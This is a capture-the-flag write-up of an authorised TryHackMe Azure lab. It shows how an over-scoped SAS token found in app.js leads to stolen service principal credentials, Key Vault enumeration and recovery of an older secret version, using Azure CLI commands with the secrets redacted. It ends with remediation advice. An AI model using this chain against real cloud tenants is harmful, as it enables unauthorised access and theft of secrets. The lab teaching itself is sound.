# TryHackMe – CryptoCabana

> Practical walkthrough of an authorised TryHackMe lab.

## Lab information

* **Event:** Hacker Holidays 2026
* **Category:** Cloud
* **Difficulty:** Medium
* **Platform:** Microsoft Azure
* **Completed:** 6 August 2026

## Objective

The objective was to investigate how the CryptoCabana seed phrase backup kiosk accessed cloud storage, determine whether that trust extended beyond its intended purpose and recover the flag.

## Reconnaissance

The target was an Azure-hosted static website offering to back up cryptocurrency seed phrases.

<img width="595" height="488" alt="Cabana-side" src="https://github.com/user-attachments/assets/e832ae57-db45-4459-be6c-5c09d0b173ed" />


Inspecting the client-side `app.js` file revealed the storage account name, intended backup container and an exposed Azure Shared Access Signature (SAS):

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "[REDACTED]";
```

The SAS granted read and list permissions at the storage account level rather than restricting access to the intended `backups` container.

## Storage enumeration

I configured the storage account and SAS token as environment variables:

```bash
ACCOUNT="cryptocabanaf5scjagc"
SAS="[REDACTED]"
```

Using the Azure CLI, I enumerated the available containers:

```bash
az storage container list \
  --account-name "$ACCOUNT" \
  --sas-token "$SAS" \
  --query "[].name" \
  --output table
```

This returned three containers:

```text
$web
backups
vault
```

The application only referenced `backups`, but the excessive permissions also exposed the unlinked `vault` container.

Listing its contents revealed two blobs:

```text
backup-service-account.json
seed_phrase.txt
```

The seed phrase file appeared to contain a decoy value and did not provide the challenge flag. 
However, `backup-service-account.json` exposed credentials belonging to an Azure service principal, together with the name and URI of an Azure Key Vault.

## Service principal access

The exposed JSON file contained the following information:

```json
{
  "client_id": "[REDACTED]",
  "client_secret": "[REDACTED]",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "tenant_id": "[REDACTED]"
}
```

I used the credentials to authenticate as the service principal:

```bash
az login \
  --service-principal \
  --username "$CLIENT_ID" \
  --password "$CLIENT_SECRET" \
  --tenant "$TENANT_ID" \
  --allow-no-subscriptions
```

The active identity was successfully changed from the temporary lab user to the service principal.

Enumerating the Key Vault revealed four secrets:

```text
key-shard-1
key-shard-2
key-shard-3
master-key
```

<img width="1155" height="702" alt="Service principal authentication and Azure Key Vault enumeration" src="https://github.com/user-attachments/assets/d48d8f80-3fcb-42aa-ba0a-e13be552f52e" />


## Secret version recovery

Reading the current values showed that the flag was divided between the three `key-shard` secrets. However, the current value of `key-shard-2` had been replaced with a message stating that it had recently been rotated.

I inspected the secret's version history:

```bash
az keyvault secret list-versions \
  --vault-name "$VAULT_NAME" \
  --name "key-shard-2" \
  --output table
```

Two versions were available. The older version was retrieved explicitly:

```bash
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name "key-shard-2" \
  --version "[OLD_VERSION_ID]" \
  --query value \
  --output tsv
```

The previous value remained accessible and provided the missing section of the flag.

<img width="1301" height="704" alt="Recovery of an older Key Vault secret version" src="https://github.com/user-attachments/assets/5612f2f3-c111-4272-aa52-94ed4d876a92" />


## Result

The recovered values were assembled in the following order:

```text
key-shard-1 + previous key-shard-2 + key-shard-3
```

This produced the challenge flag:

```text
THM{n0t_xxxxxxx_xxxxx!}
```
## Remediation

The exposed SAS token should be replaced with a short-lived, narrowly scoped token. Service principal credentials should not be stored in accessible blobs, and access to Key Vault should follow the principle of least privilege. Previously exposed credentials and secret versions should be revoked or removed.

## Disclaimer

All testing documented here was performed in an authorised TryHackMe training environment.

